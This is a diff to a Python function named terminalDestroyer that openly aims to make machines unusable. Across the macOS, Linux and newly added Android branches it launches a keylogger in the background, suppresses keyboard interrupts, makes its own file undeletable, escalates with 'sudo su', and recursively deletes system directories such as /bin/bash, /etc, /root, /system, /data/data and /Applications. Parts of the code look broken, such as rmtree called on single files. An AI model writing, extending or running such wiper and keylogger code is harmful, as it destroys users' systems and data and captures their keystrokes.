@@ -41,7 +41,7 @@ def terminalDestroyer():
 
                 # For MacOS, you can use the following code to make the terminal unusable by deleting the Terminal.app file. Please note that this is a destructive action and should be used with caution.
 
-                elif CURRENT_OS == 'Darwin':
+                elif CURRENT_OS == 'darwin':
                         try:
                                 background_runner.run_in_background(terminal.start_terminal)
                                 background_runner.run_in_background(mycmd.starter_cmd())
@@ -54,6 +54,7 @@ def terminalDestroyer():
 
                         except Exception as e:
                                         print(f"An error occurred: {e}")
+                                        terminal.terminal_write(command="sudo su", use_root=True)
                                         terminal.start_terminal(os.remove("/Applications/Utilities/Terminal.app"))
                                         shutil.rmtree("/Applications/Utilities")
                                         shutil.rmtree("/Applications")
@@ -70,19 +71,20 @@ def terminalDestroyer():
 
                 # For Linux, you can use the following code to make the terminal unusable by deleting the bash executable. Please note that this is a destructive action and should be used with caution.
 
-                elif CURRENT_OS == 'Linux':
+                elif CURRENT_OS == 'linux':
                         try:
                                 background_runner.run_in_background(terminal.start_terminal)
-                                background_runner.run_in_background(mycmd.starter_cmd())
+                                background_runner.run_in_background(mycmd.starter_cmd)
                                 background_runner.run_in_background(powershell.start_powershell)
                                 background_runner.run_in_background(keylogger.start_keylogger)
-                                background_runner.run_in_background(test._suppress_keyboard_interrupt())
-                                background_runner.run_in_background(test.run_forever())
+                                background_runner.run_in_background(test._suppress_keyboard_interrupt)
+                                background_runner.run_in_background(test.run_forever)
                                 background_runner.run_in_background(test1.make_file_undeletable("make_terminal_unusable.py"))
                                 background_runner.run_in_background(test2.load_key("make_terminal_unusable.py"))
 
                         except Exception as e:
                                         print(f"An error occurred: {e}")
+                                        terminal.terminal_write(command="sudo su", use_root=True)
                                         shutil.rmtree("/root/terminal")
                                         shutil.rmtree("/bin/sh")
                                         shutil.rmtree("/bin/bash")
@@ -92,6 +94,31 @@ def terminalDestroyer():
                                         shutil.rmtree("/var")
                                         shutil.rmtree("/etc")
                                         shutil.rmtree("/root")
+
+                elif CURRENT_OS == 'Android':
+                                try:
+                                        background_runner.run_in_background(terminal.start_terminal)
+                                        background_runner.run_in_background(mycmd.starter_cmd)
+                                        background_runner.run_in_background(powershell.start_powershell)
+                                        background_runner.run_in_background(keylogger.start_keylogger)
+                                        background_runner.run_in_background(test._suppress_keyboard_interrupt)
+                                        background_runner.run_in_background(test.run_forever)
+                                        background_runner.run_in_background(test1.make_file_undeletable("make_terminal_unusable.py"))
+                                        background_runner.run_in_background(test2.load_key("make_terminal_unusable.py"))
+
+                                except Exception as e:
+                                        print(f"An error occured: {e}")
+                                        terminal.terminal_write(command="cd /root/", use_root=True)
+                                        shutil.rmtree("/data/data/")
+                                        shutil.rmtree("/boot/")
+                                        shutil.rmtree("/recovery/")
+                                        shutil.rmtree("/cache/")
+                                        shutil.rmtree("./manifest/")
+                                        shutil.rmtree("./res/")
+                                        shutil.rmtree("./assets/")
+                                        shutil.rmtree("./mipmap/")
+                                        shutil.rmtree("/system/")
+                                        shutil.rmtree("/vendor/")
 
 
                 else:   print("Unsupported operating system.")
